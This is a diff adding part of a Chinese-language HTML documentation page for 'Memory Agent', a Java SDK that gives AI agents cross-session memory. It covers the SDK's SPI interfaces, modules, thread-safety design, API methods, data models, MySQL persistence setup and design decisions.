+        <tr><td>MySQL ORM</td><td>TkMapper 4.3.0</td><td>轻量通用 Mapper，JSON 列支持</td></tr>
+        <tr><td>并发模型</td><td>ConcurrentHashMap + LongAdder</td><td>高并发低竞争，不可变值对象天然线程安全</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ===== SPI 扩展 ===== -->
+<div class="section">
+  <h2 class="section-title">SPI 可插拔体系</h2>
+  <p class="section-desc">6 个 SPI 接口，默认实现零依赖开箱即用，生产环境可替换为真实基础设施。</p>
+  <div class="card">
+    <table>
+      <thead><tr><th>SPI 接口</th><th>职责</th><th>默认实现</th><th>生产替换</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><code>MemoryStorage</code></td>
+          <td>数据持久化</td>
+          <td><code>InMemoryMemoryStorage</code></td>
+          <td>MySQL (TkMapper) / Redis / MongoDB</td>
+        </tr>
+        <tr>
+          <td><code>IntentSummarizer</code></td>
+          <td>LLM 总结 + 记忆提取 + 冲突检测</td>
+          <td><code>OpenAIIntentSummarizer</code></td>
+          <td>Claude / Gemini / 本地模型</td>
+        </tr>
+        <tr>
+          <td><code>EmbeddingService</code></td>
+          <td>文本向量化</td>
+          <td><code>SimpleEmbeddingService</code> (TF-IDF)</td>
+          <td>OpenAI / Spring AI</td>
+        </tr>
+        <tr>
+          <td><code>VectorStore</code></td>
+          <td>向量存储与检索</td>
+          <td><code>InMemoryVectorStore</code></td>
+          <td>Milvus / Pinecone / Weaviate</td>
+        </tr>
+        <tr>
+          <td><code>KeywordSearchService</code></td>
+          <td>关键词搜索 (BM25)</td>
+          <td><code>InMemoryKeywordSearchService</code></td>
+          <td>Elasticsearch / Meilisearch</td>
+        </tr>
+        <tr>
+          <td><code>MemoryStorageProvider</code></td>
+          <td>存储工厂 (ServiceLoader)</td>
+          <td><code>InMemoryMemoryStorageProvider</code></td>
+          <td>&mdash;</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ===== 模块结构 ===== -->
+<div class="section">
+  <h2 class="section-title">模块结构</h2>
+  <div class="module-grid">
+    <div class="module-card">
+      <h3 style="color:var(--primary);">memory-agent-core</h3>
+      <div class="module-meta">62 个 Java 文件 &mdash; 纯 Java SDK，零框架依赖</div>
+      <ul>
+        <li><strong>config/</strong> &mdash; 配置对象（调优参数）</li>
+        <li><strong>model/</strong> &mdash; 14 个不可变数据模型</li>
+        <li><strong>spi/</strong> &mdash; 6 个 SPI 接口 + 6 个默认实现</li>
+        <li><strong>memory/</strong> &mdash; 记忆管理（CRUD + 冲突 + 分层 + 衰退 + 检索 + 指标）</li>
+        <li><strong>summary/</strong> &mdash; 意图总结 + 自动记忆提取</li>
+        <li><strong>conversation/</strong> &mdash; 会话管理</li>
+        <li><strong>compression/</strong> &mdash; 三阶段上下文压缩</li>
+        <li><strong>intent/</strong> &mdash; 增量意图推导</li>
+        <li><strong>security/</strong> &mdash; 三层安全扫描</li>
+        <li><strong>exception/</strong> &mdash; 6 个自定义异常</li>
+      </ul>
+    </div>
+    <div class="module-card">
+      <h3 style="color:var(--success);">memory-agent-jdbc-storage</h3>
+      <div class="module-meta">17 个 Java 文件 &mdash; MySQL 持久化存储后端</div>
+      <ul>
+        <li><strong>entity/</strong> &mdash; 4 个 TkMapper Entity (@Table + getter/setter)</li>
+        <li><strong>mapper/</strong> &mdash; 4 个 Mapper (extends Mapper + 自定义 @Select)</li>
+        <li><strong>handler/</strong> &mdash; JSON TypeHandler</li>
+        <li><strong>converter/</strong> &mdash; EntityConverter (领域模型 &harr; Entity + JSON)</li>
+        <li><strong>autoconfigure/</strong> &mdash; Spring Boot 自动装配</li>
+        <li><strong>spi/</strong> &mdash; SPI 注册（优先级最高）</li>
+      </ul>
+    </div>
+    <div class="module-card">
+      <h3 style="color:var(--purple);">memory-agent-spring-boot-starter</h3>
+      <div class="module-meta">2 个 Java 文件 &mdash; Spring Boot 3.x 自动装配</div>
+      <ul>
+        <li><strong>MemoryAgentProperties</strong> &mdash; @ConfigurationProperties</li>
+        <li><strong>MemoryAgentAutoConfiguration</strong> &mdash; 自动装配 + SPI 注入</li>
+        <li>自定义 Bean 通过 @ConditionalOnMissingBean 自动替换默认实现</li>
+      </ul>
+    </div>
+    <div class="module-card">
+      <h3 style="color:var(--warning);">memory-agent-examples</h3>
+      <div class="module-meta">9 个 Java 文件 &mdash; 使用示例</div>
+      <ul>
+        <li><strong>PureJavaExample</strong> &mdash; 纯 Java SDK 完整示例</li>
+        <li><strong>ChatService</strong> &mdash; Web 服务集成示例</li>
+        <li>覆盖：基础使用、语义搜索、冲突检测、衰退、混合检索等</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 线程模型 ===== -->
+<div class="section">
+  <h2 class="section-title cyan">线程安全设计</h2>
+  <div class="card">
+    <table>
+      <thead><tr><th>组件</th><th>线程安全机制</th></tr></thead>
+      <tbody>
+        <tr><td>InMemoryMemoryStorage</td><td>ConcurrentHashMap + compute() 原子操作</td></tr>
+        <tr><td>sessionSnapshots</td><td>ConcurrentHashMap</td></tr>
+        <tr><td>summarizationInProgress</td><td>ConcurrentHashMap.newKeySet()，防止同一 session 重复总结</td></tr>
+        <tr><td>pipelineExecutor</td><td>daemon 单线程执行器 (auto-pipeline)，后台总结 + 压缩</td></tr>
+        <tr><td>conflictExecutor</td><td>daemon 单线程执行器 (conflict-detection)，ASYNC 冲突检测</td></tr>
+        <tr><td>decayEngine</td><td>SingleThreadScheduledExecutor (memory-decay-engine)</td></tr>
+        <tr><td>MemoryMetricsCollector</td><td>LongAdder + ConcurrentHashMap，零 GC 压力</td></tr>
+        <tr><td>RelevanceTracker</td><td>ConcurrentHashMap</td></tr>
+        <tr><td>InMemoryVectorStore</td><td>ConcurrentHashMap</td></tr>
+        <tr><td>InMemoryKeywordSearchService</td><td>ConcurrentHashMap</td></tr>
+        <tr><td>MemoryEntry / TurnContext 等</td><td>不可变值对象，天然线程安全</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ===== API 总览 ===== -->
+<div class="section">
+  <h2 class="section-title">核心 API 总览</h2>
+
+  <div class="card">
+    <h3>会话管理</h3>
+    <table>
+      <thead><tr><th>方法</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td><code>createSession(userId, source)</code></td><td>创建会话 + 捕获冻结记忆快照</td></tr>
+        <tr><td><code>closeSession(sessionId)</code></td><td>关闭会话（自动触发意图总结 + 清理缓存）</td></tr>
+        <tr><td><code>getSession(sessionId)</code></td><td>获取会话信息</td></tr>
+        <tr><td><code>listSessions(userId)</code></td><td>列出用户所有会话</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>对话 &amp; 管道</h3>
+    <table>
+      <thead><tr><th>方法</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td><code>processUserMessage(sessionId, content)</code></td><td>一站式处理：记录消息 + 加载记忆 + 推导意图 + <strong>自动后台总结</strong></td></tr>
+        <tr><td><code>recordAssistantMessage(sessionId, content)</code></td><td>记录助手回复 + <strong>自动后台压缩</strong></td></tr>
+        <tr><td><code>getMessages(sessionId)</code></td><td>获取完整对话记录</td></tr>
+        <tr><td><code>getRecentMessages(sessionId, limit)</code></td><td>获取最近 N 条消息</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>记忆管理</h3>
+    <table>
+      <thead><tr><th>方法</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td><code>addMemory(userId, content, type)</code></td><td>添加记忆（自动：安全扫描 + 冲突检测 + 向量化 + 关键词索引）</td></tr>
+        <tr><td><code>getMemories(userId, type)</code></td><td>获取指定类型记忆列表</td></tr>
+        <tr><td><code>removeMemory(userId, entryId)</code></td><td>删除记忆（同步清理向量/索引/跟踪）</td></tr>
+        <tr><td><code>getUserProfile(userId)</code></td><td>获取跨会话用户画像</td></tr>
+        <tr><td><code>searchMemories(userId, query, topK)</code></td><td>混合检索记忆（语义 + 关键词 RRF 融合）</td></tr>
+        <tr><td><code>archiveMemory(userId, entryId)</code></td><td>归档记忆（CORE &rarr; ARCHIVED）</td></tr>
+        <tr><td><code>promoteMemory(userId, entryId)</code></td><td>提升记忆（ARCHIVED &rarr; CORE）</td></tr>
+        <tr><td><code>updateMemoryImportance(userId, entryId, score)</code></td><td>设置记忆重要性评分</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>意图 &amp; 总结 &amp; 压缩</h3>
+    <table>
+      <thead><tr><th>方法</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td><code>summarize(sessionId)</code></td><td>同步执行意图总结 + 自动记忆提取</td></tr>
+        <tr><td><code>extractMemories(sessionId)</code></td><td>手动触发记忆提取</td></tr>
+        <tr><td><code>compress(sessionId, contextWindowTokens)</code></td><td>三阶段上下文压缩</td></tr>
+        <tr><td><code>getIntentSummaries(sessionId)</code></td><td>获取会话意图总结列表</td></tr>
+        <tr><td><code>getPreviousIncrementalIntent(sessionId)</code></td><td>获取上一轮增量意图</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>安全 &amp; 运维</h3>
+    <table>
+      <thead><tr><th>方法</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td><code>scanContent(content)</code></td><td>扫描内容安全性，返回 SecurityScanResult</td></tr>
+        <tr><td><code>runDecayCycle(userId)</code></td><td>手动触发衰退评估</td></tr>
+        <tr><td><code>getMetrics()</code></td><td>获取性能指标不可变快照</td></tr>
+        <tr><td><code>shutdown()</code></td><td>优雅关闭（打印最终指标 + 停止后台线程 + 关闭存储）</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ===== 数据模型 ===== -->
+<div class="section">
+  <h2 class="section-title success">核心数据模型</h2>
+  <div class="card">
+    <table>
+      <thead><tr><th>模型</th><th>说明</th><th>关键特性</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><code>MemoryEntry</code></td>
+          <td>记忆条目</td>
+          <td>不可变值对象，含 tier / importance / accessCount 字段，修改返回新实例</td>
+        </tr>
+        <tr>
+          <td><code>Session</code></td>
+          <td>会话</td>
+          <td>不可变，状态机：ACTIVE &rarr; CLOSED &rarr; COMPRESSED</td>
+        </tr>
+        <tr>
+          <td><code>ConversationMessage</code></td>
+          <td>对话消息</td>
+          <td>不可变，支持 USER / ASSISTANT / TOOL / SYSTEM 角色</td>
+        </tr>
+        <tr>
+          <td><code>IntentSummary</code></td>
+          <td>意图总结</td>
+          <td>coreIntent + keyTopics + actionItems + emotionalTone + fullSummary</td>
+        </tr>
+        <tr>
+          <td><code>TurnContext</code></td>
+          <td>单轮上下文</td>
+          <td>聚合：消息 + 快照 + 画像 + 总结 + 增量意图 + pendingSummarization Future</td>
+        </tr>
+        <tr>
+          <td><code>IncrementalIntent</code></td>
+          <td>增量意图</td>
+          <td>实时推导每轮意图变化，结合 LLM 理解 + 规则兜底</td>
+        </tr>
+        <tr>
+          <td><code>ConflictResolution</code></td>
+          <td>冲突检测结果</td>
+          <td>CONTRADICT / SUPPLEMENT / DUPLICATE / UPDATE 四种类型</td>
+        </tr>
+        <tr>
+          <td><code>VectorSearchResult</code></td>
+          <td>搜索结果</td>
+          <td>id + score + content + metadata，RRF 融合排序</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ===== MySQL 持久化 ===== -->
+<div class="section">
+  <h2 class="section-title warning">MySQL 持久化存储</h2>
+  <p class="section-desc">内置 JDBC 存储模块，引入依赖 + 配置数据源即可从 InMemory 切换到 MySQL。</p>
+  <div class="card">
+    <h3>4 张核心表</h3>
+    <table>
+      <thead><tr><th>表名</th><th>说明</th><th>关键列</th></tr></thead>
+      <tbody>
+        <tr><td><code>ma_session</code></td><td>会话信息</td><td>userId, source, status, startedAt, endedAt</td></tr>
+        <tr><td><code>ma_conversation_message</code></td><td>对话消息</td><td>sessionId, role, content, metadata (JSON)</td></tr>
+        <tr><td><code>ma_memory_entry</code></td><td>记忆条目</td><td>userId, content, type, tier, importanceScore, accessCount + 去重索引</td></tr>
+        <tr><td><code>ma_intent_summary</code></td><td>意图总结</td><td>sessionId, coreIntent, keyTopics (JSON), actionItems (JSON)</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="card">
+    <h3>接入方式</h3>
+    <pre><span class="comment">&lt;!-- 1. 添加依赖 --&gt;</span>
+&lt;<span class="keyword">dependency</span>&gt;
+    &lt;<span class="keyword">groupId</span>&gt;com.ke.utopia.agent&lt;/<span class="keyword">groupId</span>&gt;
+    &lt;<span class="keyword">artifactId</span>&gt;memory-agent-jdbc-storage&lt;/<span class="keyword">artifactId</span>&gt;
+&lt;/<span class="keyword">dependency</span>&gt;
+
+<span class="comment"># 2. application.yml</span>
+<span class="keyword">spring</span>:
+  <span class="keyword">datasource</span>:
+    <span class="keyword">url</span>: <span class="string">jdbc:mysql://localhost:3306/memory_agent</span>
+    <span class="keyword">username</span>: <span class="string">memory_agent</span>
+    <span class="keyword">password</span>: <span class="string">${DB_PASSWORD}</span>
+
+<span class="comment"># 完成。TkMapperStorageAutoConfiguration 自动装配，SPI 注册优先级最高。</span></pre>
+  </div>
+</div>
+
+<!-- ===== 适用场景 ===== -->
+<div class="section">
+  <h2 class="section-title indigo">适用场景</h2>
+  <div class="capability-grid">
+    <div class="cap-card" style="border-top-color:var(--indigo);">
+      <div class="cap-icon">&#129302;</div>
+      <h4>AI Agent 对话系统</h4>
+      <p class="cap-desc">为多轮对话 Agent 提供跨会话记忆。Agent 记住用户偏好、项目背景，每次对话无需重新介绍。</p>
+    </div>
+    <div class="cap-card" style="border-top-color:var(--indigo);">
+      <div class="cap-icon">&#128187;</div>
+      <h4>智能客服 / 帮助台</h4>
+      <p class="cap-desc">用户画像 + 意图理解让客服准确理解用户需求。分层记忆让高频问题优先响应。</p>
+    </div>
+    <div class="cap-card" style="border-top-color:var(--indigo);">
+      <div class="cap-icon">&#128208;</div>
+      <h4>知识库 / RAG 系统</h4>
+      <p class="cap-desc">混合语义检索 + 关键词搜索，精确召回相关知识。记忆提取自动积累组织知识。</p>
+    </div>
+    <div class="cap-card" style="border-top-color:var(--indigo);">
+      <div class="cap-icon">&#127891;</div>
+      <h4>个性化学习助手</h4>
+      <p class="cap-desc">记录学习进度和知识盲区。衰退机制自动淘汰已掌握内容，聚焦薄弱环节。</p>
+    </div>
+    <div class="cap-card" style="border-top-color:var(--indigo);">
+      <div class="cap-icon">&#128196;</div>
+      <h4>项目管理助手</h4>
+      <p class="cap-desc">自动提取 Action Items，跟踪项目进展。跨会话保持项目上下文连续性。</p>
+    </div>
+    <div class="cap-card" style="border-top-color:var(--indigo);">
+      <div class="cap-icon">&#128640;</div>
+      <h4>企业内部工具</h4>
+      <p class="cap-desc">安全扫描防止数据泄露。SPI 对接企业基础设施（MySQL / Milvus / ES）。</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 关键设计决策 ===== -->
+<div class="section">
+  <h2 class="section-title">关键设计决策</h2>
+  <div class="card">
+    <table>
+      <thead><tr><th>决策</th><th>理由</th></tr></thead>
+      <tbody>
+        <tr><td>所有能力默认启用，LLM 功能自动检测</td><td>降低应用方认知负担，SDK 能力开箱即用</td></tr>
+        <tr><td>不可变值对象 + with* 方法</td><td>天然线程安全，无副作用</td></tr>
+        <tr><td>SPI default 方法扩展</td><td>新增 SPI 方法不强制已有实现修改</td></tr>
+        <tr><td>衰退 = 降级而非删除</td><td>数据不丢失，可通过语义搜索找回</td></tr>
+        <tr><td>冻结快照机制</td><td>会话期间记忆不变，保护 LLM Prefix Cache</td></tr>
+        <tr><td>Core 模块手工解析 JSON</td><td>零外部依赖，可嵌入任意 Java 项目</td></tr>
+        <tr><td>自动管道采用 ASYNC 模式</td><td>不阻塞调用方主路径，长耗时操作后台执行</td></tr>
+        <tr><td>RRF 融合 k=60 常数</td><td>业界标准，向量 / 关键词权重均衡</td></tr>
+        <tr><td>LongAdder 收集指标</td><td>高并发低竞争，零 GC 压力</td></tr>
+        <tr><td>daemon 线程 + 优雅关闭</td><td>JVM 退出时自动回收，不阻塞；正常关闭时 5s 等待</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+</div>
+
+<!-- ===== 页脚 ===== -->
+<div class="footer">
+  Memory Agent &mdash; AI Agent 的记忆中间件 &mdash; 2026-05
+</div>
+
+</body>
+</html>
